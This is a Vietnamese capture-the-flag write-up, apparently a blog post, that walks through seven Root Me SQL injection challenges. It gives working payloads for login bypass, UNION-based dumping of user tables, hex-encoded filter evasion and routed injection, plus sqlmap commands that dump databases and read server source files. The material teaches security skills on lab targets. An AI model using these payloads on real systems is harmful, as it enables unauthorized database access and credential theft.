# 1. Giới thiệu chung: 
Root me là 1 trang web chơi ctf miễn phí bao gồm rất nhiều dạng từ crypto, forensic, web. Đây là 1 trang rất phù hợp cho những người mới bắt đầu học do nó bao gồm những bài từ đơn giản đến phức tạp, được chia thành các challenge rõ ràng. Hôm nay ta sẽ tìm hiểu các bài về khai thác sql injection trên root me. 
# 2. Khai thác
## SQL injection - Authentication
Link: [http://challenge01.root-me.org/web-serveur/ch9/](http://challenge01.root-me.org/web-serveur/ch9/)
Bài đầu tiên về sql injection nên cũng khá đơn giản. Họ cho mình 1 trang web có chức năng login.

![](https://images.viblo.asia/49f833e9-e172-4799-b92c-f0cf8525696b.png)

Ta chỉ cần nhập đơn giản với `username = admin’-- và password = a`. Vậy là đăng nhập thành công.

![](https://images.viblo.asia/e0fc69d4-044f-411e-8d07-404945dda170.png)

Để xem password ta chỉ cần nhấn ctrl + U mở source code lên là được. Password cũng chính là flag.

![](https://images.viblo.asia/b3228bd6-c69d-48b9-aeed-835d633d8ef2.png)

## SQL injection - String
Link: [http://challenge01.root-me.org/web-serveur/ch19/](http://challenge01.root-me.org/web-serveur/ch19/)

Bài này cho ta nhiều lựa chọn hơn, ta có các chức năng như đăng nhập, tìm kiếm hay xem thông tin . Tuy nhiên lỗi sqli xuất hiện tại ô tìm kiếm. Để biết được tại sao lại bị lỗi sqli ta chỉ cần nhập vào ký tự `1’` . Lỗi sẽ xuất hiện như sau: 

![](https://images.viblo.asia/7624daaa-4b54-4090-a880-2ad415eb64e8.png)

Như vậy chức năng tìm kiếm bị lỗi sqli và database sử dụng là SQLite3. Ta sẽ thực hiện khai thác trên SQLite3. Các bước khai thác thực hiện lần lượt như sau:

Đầu tiên sử dụng lệnh: `1’ order by 1--` để kiểm tra số cột cho phép.
Đến `1' order by 3--` thì bị lỗi: 

![](https://images.viblo.asia/71f9c00d-993c-4bfb-9bd1-f3397aeab5ec.png)

Vậy là database này có 2 cột.
Sau đó ta sẽ thử kiểm tra xem cột nào có thể khai thác. Gõ lệnh:
`1’ union select 1,2--`

![](https://images.viblo.asia/126820c1-da5c-4f5c-880a-627115938482.png)

Kết quả cho thấy ta có thể khai thác tại cả 2 cột.
Bây giờ thực hiện khai thác lấy tên bảng. Với SQLite3 ta gõ lệnh sau:
`1' union select 1,sql from sqlite_master--`

![](https://images.viblo.asia/b5f6319e-f6b7-4ce8-abae-2d429d0e0855.png)

Ta thấy có 1 bảng là user chứa cột password và username. Thực hiện đọc 2 cột này ra với lệnh:
`1’ union select username,password FROM users--`

![](https://images.viblo.asia/18f47a43-f16e-42b4-9ec6-66541f6a1b1b.png)

Như vậy là ra được 3 giá trị user. Trong đó có 1 tài khoản admin, password của admin chính là flag.
## SQL injection - Numeric
Link: http://challenge01.root-me.org/web-serveur/ch18/
Về cách khai thác của bài này khá giống với bài String bên trên. Tuy nhiên bài này lỗi sqli xảy ra khi ta GET dữ liệu nên ta có thể khai thác trực tiếp trên url. Trước hết vào Trang Système de news. Nhìn trên url sẽ có `action=new&new_id=1`. Thêm ký tự ‘ vào sau số 1 sẽ xuất hiện lỗi. 

![](https://images.viblo.asia/0a3afea6-1db2-4da6-b9ed-afc11cd92332.png)

Vậy là trang này sử dụng database là SQLite3 và cũng có thể khai thác SQL injection. Tương tự sử dụng order by để xem số cột. Bài hay hơi khác là ta không sử dụng được ký tự ‘ để ngắt chuỗi. Mà có vẻ như đầu vào nhận 1 số nên khi ta nhập vào 1 số vào sau đó là 1 chuỗi thì chuỗi đấy sẽ được thực thi riêng. Ví dụ:
`1 order by 4-- `

![](https://images.viblo.asia/76e45a72-8808-4963-a57d-a870409ddcf8.png)

Kết quả trả về cho ta thấy trang này có 3 cột từ 1 đến 3. Tiếp tục sử dụng tương tự như bài String để lấy lần lượt dữ liệu: table->column->data_login.

`1 union select 1,2,3--`

![](https://images.viblo.asia/31377020-4994-47ca-944e-d70d402cdbe1.png)

Ta có thể khai thác tại cột thứ 2 và 3. lấy tên table:
`1 union select 1,sql,3 FROM sqlite_master--`

![](https://images.viblo.asia/04641646-3665-4901-b149-c636948bcc9d.png)
Lấy giá trị của user:
`1 union select 1,username,password FROM users--`

![](https://images.viblo.asia/497fdfb8-c139-4195-b73f-2bb47b4c1be0.png)

Giá trị password của admin chính là flag cần tìm.
## SQL Injection - Routed
Link: http://challenge01.root-me.org/web-serveur/ch49/
Bài này là dạng sqli routed. Đây là 1 dạng sqli khá hay. Về cơ bản thường ta sẽ khai thác `‘ union select (giá trị muốn khai thác)`. Tuy nhiên thì với routed thì giá trị truy vấn với select đầu tiên sẽ không phải là truy vấn đầu vào. Thử với` ‘ union select 1-- `

![](https://images.viblo.asia/b647ddd4-a726-4d06-b2d2-9a1c0fa756ba.png)

Thì kết quả đầu ra hiển thị đầy đủ truy vấn nhưng không xuất hiện lỗi. Với dạng này ta sẽ sử dụng đầu ra của truy vấn để thực hiện khai thác. Nói đơn giản là trong union select sẽ lại là 1 truy vấn khác. Ví dụ:
`‘ union select 1’ order by 1--`
Ta sử dụng burpsuite để bắt truy vấn và thực hiện cho đơn giản

![](https://images.viblo.asia/5fdfd52f-b6a2-41f7-904d-ddd540e5da43.png)

Kết quả trả về `“attack detected”` chứng tỏ truy vấn đã bị filter mất. Đến đây thì lại bị bí mất. Cuối cùng quyết định lên các diễn đàn để xem gợi ý về bài này. Thì có 1 gợi ý là mã hóa đoạn lệnh thứ 2 về dạng hexa thì sẽ khai thác được. Ta sẽ sử dụng luôn chức năng decode trong burpsuite để mã hóa

![](https://images.viblo.asia/01a2bb27-6991-42d8-a172-e242e4c982a6.png)

Chuyển đoạn đã mã hóa và đoạn truy vấn thì được:

![](https://images.viblo.asia/4151e480-ec25-47aa-b415-8d489c6b62c1.png)

Như vậy là đã khai thác thành công và truy vấn trả về thông báo có 2 cột. 
Ta sẽ xem cột nào có thể khai thác.
Đoạn sau này sẽ chứa truy vấn dạng bình thường, Bạn đọc tự hiểu là khi khai thác ta sẽ tự động mã hóa sang hex
Gõ lệnh: 
`union select 1’ union select 1,2-- - -- - `

![](https://images.viblo.asia/e32f2841-84db-4165-bbf5-e65730e1ad51.png)

Do cột thứ nhất là ID nên chỉ trả về số. Trong đó cột thứ 2 là email có thể trả về kết quả dạng xâu. Nên ta sẽ thực hiện khai thác tại cột thứ 2.
Tiếp theo ta sẽ xem thử database đang sử dụng là gì. Sử dụng version để kiểm tra. Thử đến lệnh:`1’ union select 1’ union select @@version-- - -- -` thì kết quả trả về như sau

![](https://images.viblo.asia/c85be0f9-e889-4279-b2c7-aadd2d17e6e2.png)
Tuy không hiện database là kiểu gì tuy nhiên từ version trả về ta có thể hiểu trang này sử dụng MySQL làm database. Thực hiện khai thác sqli với MySQL:
Gõ lệnh: `1’ union select ' union select 1, table_name from information_schema.tables where table_schema = database() -- - -- -`

![](https://images.viblo.asia/939ba888-700e-4332-a3d1-941bb75e1a12.png)

Kết quả trả về cho ta 1 bảng users. Ta sẽ đọc xem có những cột nào trong bảng users. Để đọc được nhiều cột trả về ta sẽ sử dụng lệnh group_concat() để nhóm các cột lại với nhau. Gõ lệnh:
`1’ union select ' union SELECT 1,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users'-- - -- -`

![](https://images.viblo.asia/c36b4578-9da9-46fb-8287-3c732656861c.png)

Kết quả trả về có 2 cột cần quan tâm là login và password. Thực hiện đọc data trong 2 cột này ra. Sử dụng ký tự : để phân cách giữa username và password:
Gõ lệnh:
`1’ union select ' union SELECT 1,group_concat(login,' : ',password) FROM users-- - -- -`

![](https://images.viblo.asia/0d13787a-888c-4478-a96c-8a6e6cd1c6f8.png)

Kết quả về 3 users. Trong đó password của admin chính là flag.


Sau đây là 2 bài sqli sử dụng sqlmap để khai thác. 2 bài trên sẽ thực hiện 2 cách khai thác sqlmap khác nhau ứng với 2 phương thức GET và POST
## SQL injection - Error
Link: [http://challenge01.root-me.org/web-serveur/ch34/](http://challenge01.root-me.org/web-serveur/ch34/)
Bài này lỗi sqli nằm tại page Contents. Thực hiện vào trang và gõ thêm ký tự ‘ ở cuối url sẽ xuất hiện lỗi:

![](https://images.viblo.asia/3367e364-eb4b-4b4c-8085-778efd7b544f.png)

Như vậy ta có thể khai thác được sqli. Sử dụng sqlmap khai thác với url ta sử dụng `-u`
Vào sqlmap. Tại đây gõ lệnh sau:
`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs`
Trong đó đoạn trong ngoặc kép là url của trang cần khai thác. --dbs là để lấy dữ liệu database. Chờ 1 lúc thì được kết quả:

![](https://images.viblo.asia/a3c300d2-fbb3-4715-9358-06afd952b9aa.png)

Kết quả trả về cho ta thấy bài này xuất hiện 2 cách khai thác sqli bao gồm khai khác blind và error. Có 3 database trả về, tuy nhiên ta chỉ cần chú ý đến database public là được. Thực hiện lấy các tables trên database này:
Gõ lệnh:
`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables`

Trong đó `--tables` sử dụng để lấy tên các bảng. `-D public` là để lấy kết quả trong database public.

![](https://images.viblo.asia/d42fc451-219c-43ff-b85c-ce59cb34ec6b.png)

	Ta có 1 bảng là `m3mbr35t4bl3`. Thực hiện lấy data trong bảng. Gõ lệnh:
`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`
Trong đó `-T` là bảng cần lấy data. `--dump` để lấy toàn bộ dữ liệu bảng này:

![](https://images.viblo.asia/a436be20-1259-4282-9ae3-6cac39b7ce1d.png)

Kết quả được 1 hàng có dữ liệu của admin. Password chính là flag của bài.
## SQL injection - Blind
Link: http://challenge01.root-me.org/web-serveur/ch10/
Bài này cho ta 1 trang đăng nhập. Thực hiện đăng nhập vào và kiểm tra khai thác sqli thì không có kết quả trả về -> đây là dạng blind sql injection. Bài này sử dụng phương thức POST để truyền truy vấn nên ta sẽ bắt bằng burpsuite

![](https://images.viblo.asia/3efe6566-8d6a-4660-a9fe-3a9790249349.png)

Tại request ta thấy ta truyền vào 2 payload là username và password. Ta sẽ sử dụng sqlmap để thực hiện khai thác bài này.

![](https://images.viblo.asia/121d55a1-c324-495b-8681-7e6a8d8e7dbf.png)

Trước hết copy phần request lưu vào 1 file, ở đây là file bind.txt. Sau đó mở sqlmap lên, tại đây là sử dụng options -r để đọc file. Gõ lệnh:
`python sqlmap.py -r D:\Chibi\ISP\Web\sqlmap\blind.txt --dbs`
Trong đó `D:\Chibi\ISP\Web\sqlmap\blind.txt` là đường dẫn đến file đã lưu. `--dbs` để lấy tên database

![](https://images.viblo.asia/ebde051c-5fd7-4e47-bd9f-3b0b16cdd249.png)

Kết quả trả về cho ta thấy trang web bị lỗi time-based blind SQL injection. Không có database trả về, tuy nhiên nó gợi ý cho chúng ta khai thác luôn tên bảng. Ta gõ lệnh:

`python sqlmap.py -r D:\Chibi\ISP\Web\sqlmap\blind.txt --tables`

![](https://images.viblo.asia/a997794e-8962-4060-8530-a6d4d5b84ea9.png)

Kết quả trả về 1 bảng là users. Ta thực hiện dump toàn bộ dữ liệu trong bảng ra.
`python sqlmap.py -r D:\Chibi\ISP\Web\sqlmap\blind.txt -T users --dump`

![](https://images.viblo.asia/27813429-63f4-4684-9e30-9b5e4fbef4ea.png)

Sau 1 thời gian sẽ được 1 bảng chứa dữ liệu người dùng. Trong đó password của admin chính là flag.

## SQL injection - File reading
Bài này về phần khai thác ban đầu tương tự như những bài trên.Bài này có filter mất ký tự `‘` và `“` nên nếu cần sử dụng, ta sẽ mã hóa đoạn đó sang hex để sử dụng. Ta cũng thực hiện khai thác lần lượt để lấy dữ liệu. Ta sẽ lấy cột có thể khai thác. Gõ lệnh:

`-1 union select 1,2,3,4--`

![](https://images.viblo.asia/4220c310-1648-4bed-ba5a-53667cbcfe7c.png)

Kết quả trả về cột 1,2,4 có thể khai thác. Tuy nhiên ta sẽ follow vào cột 4 do cột này trả về email người dùng dạng xâu. Khai thác lấy tên bảng:

`-1 union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema = database()--`

![](https://images.viblo.asia/58187e86-2b78-44c4-bc8b-cbd8305cbfe4.png)

Vậy là có 1 bảng tên `member`. Thực hiện lấy `column_name` từ bảng `member`.

Trong đó `‘member’` được mã hóa sang mã hex:

`-1 union select 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 0x6d656d626572--`

![](https://images.viblo.asia/aa77bb23-6784-4058-802f-c1390c95ebda.png)


Kết quả trả về 4 cột, tuy nhiên ta chỉ cần lấy 2 cột `member_login` và `member_password` để khai thác là được. Thực hiện lấy dữ liệu 2 cột:

`-1 union select 1,2,3,group_concat(member_login,member_password) FROM member--`

![](https://images.viblo.asia/efbdcbb1-1745-475e-8ed8-98d1bb63ca88.png)


Đến đây là ra được admin và password. Tuy nhiên password này đã bị mã hóa. Nhìn vào thì thấy ngay đây là mã hóa b64 nên nghĩ chỉ cần decode b64 là ra. Tuy nhiên thì sau khi decode lại không được giá trị cần. Có lẽ trang web còn sử dụng 1 vài phương thức khác để mã hóa. Đọc lại đề bài thì là file_reading, như vậy có lẽ ta cần lấy được source code để giải mã được password. Đến đây ta sẽ sử dụng sqlmap để đọc file cho dễ. Gõ lệnh:

`python sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch31/?action=members&id=1" --file-read=/challenge/web-serveur/ch31/index.php`

Trong đó `--file-read` là options để đọc file. Đoạn đằng sau là đường link của trang web mà ta muốn lấy code. Sau 1 thời gian ta được:

![](https://images.viblo.asia/a98d5dec-ab85-4472-b099-9d93f64f85f3.png)

Vậy là đã lấy được code. Đoạn code được lưu vào 1 file như trên. Mở file ra được:

![](https://images.viblo.asia/f3baaf6e-3f6d-4b10-84c3-0d4709d10b84.png)



Về cơ bản thì đoạn code thực hiện mã hóa theo 3 phương thức. Sử dụng sha1, xor string và base64. Về sha1 và base64 thì ta chỉ cần dùng tool giải mã trên mạng là được. Còn về XOR thì ta cần biết 1 chút kiến thức. Với `a XOR b = c` thì `a XOR c = b` => ta hoàn toàn có thể sử dụng chính đoạn code trên để giải mã XOR. thực hiện code như sau:

![](https://images.viblo.asia/031ffd3b-b858-4fa4-837f-9edc13edadc4.png)


 Như vậy là được kết quả dạng mã hóa sha1. Giờ chỉ cần decrypt sha1 là thành công:
 
![](https://images.viblo.asia/6f0413a0-95dc-487d-8f25-e8fefa5055bd.png)

Như vậy password là: `superpassword`. Đây cũng chính là flag của bài.